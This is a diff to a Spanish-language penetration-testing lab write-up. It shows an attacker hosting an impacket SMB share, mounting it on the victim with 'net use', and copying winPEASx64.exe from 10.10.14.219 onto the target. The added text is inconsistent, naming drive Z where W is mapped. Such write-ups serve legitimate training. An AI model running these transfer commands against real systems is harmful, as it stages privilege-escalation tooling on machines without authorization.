@@ -240,7 +240,11 @@ Lo subimos a la maquina con:
 `impacket-smbserver smbFolder $(pwd) -smb2support -username jalag -password 12345`
 
 Y en la maquina victima nos lo traemos con:
-`net use z: \\10.10.14.219\smbFolder /u:jalag 12345`
+`net use w: \\10.10.14.219\smbFolder /u:jalag 12345`
+
+Y nos hemos enviado el archivo a `Z` y ahora nos lo traemos a nuestro directorio acctual de trabajp con:
+`copy w:\winPEASx64.exe winPEASx64.exe`
+
 
 
 
